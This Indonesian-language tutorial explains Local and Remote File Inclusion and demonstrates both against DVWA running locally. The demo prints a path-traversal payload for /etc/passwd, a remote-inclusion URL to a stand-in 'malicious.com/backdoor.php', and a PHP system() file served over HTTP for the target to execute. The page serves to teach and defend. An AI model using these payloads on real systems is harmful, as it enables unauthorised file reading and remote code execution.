---
title: Memahami File Inclusion
prev: /docs/hacking/hacking_fundamentals/
---

## Apa itu File Inclusion?

File Inclusion adalah kerentanan yang terjadi ketika aplikasi web tidak memvalidasi input dengan benar yang digunakan untuk mengakses file di server. Kerentanan ini memungkinkan hacker mengakses file yang seharusnya tidak terdaftar pada aplikasi.

### Kategori File Inclusion

1. **Local File Inclusion (LFI)**

   - Hacker dapat membaca file yang tidak diinginkan dengan cara menyisipkan perintah inklusi file lokal pada input aplikasi web.
   - Terjadi pada aplikasi yang mengizinkan user mengunggah file tanpa validasi upload yang memadai.
   - Contoh: hacker menyisipkan path lokal seperti `../../etc/passwd` untuk membaca file konfigurasi sensitif.

2. **Remote File Inclusion (RFI)**
   - Hacker dapat menyisipkan file yang dihosting di luar sistem untuk diakses oleh aplikasi web.
   - Terjadi ketika aplikasi menerima input tanpa validasi yang memadai, memungkinkan file remote diakses dan dijalankan di server.
   - Contoh: hacker menyisipkan URL eksternal seperti `http://malicious.com/backdoor.php`.

### Dampak

- Membaca file sensitif seperti `passwd` pada sistem operasi.
- Menjalankan file berbahaya yang diunggah oleh hacker.
- Memberikan akses tak terbatas ke sistem file server.

### Pencegahan

- Lakukan sanitasi dan validasi data input dengan ketat.
- Hindari penggunaan fungsi yang rentan seperti `include`, `require`, `include_once`, dan `require_once` dengan input dinamis.
- Gunakan whitelist file yang diizinkan untuk diakses.
- Konfigurasikan server untuk membatasi akses file dan direktori tertentu.

## Demo File Inclusion di DVWA

### Persiapan

1. Pastikan level keamanan DVWA disetel ke **Low**.
2. Pergi ke menu **File Inclusion**.

### Eksperimen Local File Inclusion (LFI)

1. DVWA memiliki beberapa file seperti `file1.php`, `file2.php`, dan `file3.php`:
   - **file1.php**: Berisi Username dan IP.
   - **file2.php**: Berisi catatan dari aplikasi.
   - **file3.php**: Informasi tentang sistem (localhost).
2. Akses file `file1.php` melalui URL dan coba eksplorasi direktori root:

   ```
   localhost:4280/vulnerabilities/fi/?page=.../../../../../etc/passwd
   ```

3. Isi file `/etc/passwd` akan ditampilkan, menunjukkan bahwa server rentan terhadap LFI.

### Eksperimen Remote File Inclusion (RFI)

1. Gunakan URL berikut untuk mencoba menyisipkan file dari sumber eksternal:

   ```
   localhost:4280/vulnerabilities/fi/?page=https://google.com
   ```

   ![RFI 1](/images/RFI1.png)

2. Untuk simulasi RFI, buat file PHP berisi kode berikut, simpan sebagai `rfi.php`:

   ```php
   <?php system("ls"); ?>
   ```

3. Jalankan server HTTP lokal untuk menghosting file `rfi.php`. Misalnya, jika IP lokal adalah `192.168.8.120`:

   ```bash
   python3 -m http.server 8000
   ```

4. Gunakan URL berikut untuk menyisipkan file remote:

   ```
   localhost:4280/vulnerabilities/fi/?page=http://192.168.8.120:8000/rfi.php
   ```

5. Server akan menjalankan perintah `ls` dan menampilkan hasilnya.

   ![RFI 2](/images/RFI2.png)

### Catatan Tambahan

- Pastikan DVWA berjalan di lingkungan yang aman (sandbox) saat melakukan eksperimen ini.
- Jangan gunakan teknik ini di sistem produksi atau tanpa izin.

## Kesimpulan

Dengan memahami mekanisme LFI dan RFI, kita dapat mengenali potensi risiko keamanan yang dihadapi aplikasi web dan mengambil langkah-langkah mitigasi yang tepat untuk mencegah eksploitasi serupa.
